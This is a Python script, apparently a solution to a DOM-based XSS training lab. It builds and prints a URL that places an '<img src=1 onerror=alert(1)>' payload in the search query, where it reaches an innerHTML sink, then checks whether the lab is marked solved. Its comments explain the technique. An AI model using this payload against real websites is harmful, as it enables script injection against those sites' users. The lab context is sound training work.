import argparse
import requests

# DOM XSS in an innerHTML sink using source location.search. The page's JavaScript
# reads the search query from location.search and assigns it to an element's
# innerHTML. innerHTML won't run a <script> tag, so <img src=1 onerror=alert(1)>
# fires via its event handler instead. No breakout needed - the value is written
# as element content, not inside an attribute.
#
# DOM-based: exploitation happens in the browser, so Python can't fire the alert.
# The script prints the exploit URL and checks the lab status.

parser = argparse.ArgumentParser(description="Solve XSS lab 4 (DOM XSS, innerHTML sink, location.search source)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--payload", default="<img src=1 onerror=alert(1)>",
                    help="Event-handler payload placed in the search query")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# the payload rides in the URL because the source is location.search; the page's
# JS reads it client-side and assigns it to innerHTML.
exploit_url = f"{lab_url}/?search={requests.utils.quote(args.payload)}"

print("[*] This is DOM-based XSS - the payload executes in the browser, not server-side.")
print("[*] Open this URL in a browser to trigger the alert:")
print(f"    {exploit_url}")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Not marked solved yet - load the exploit URL above in a browser.")
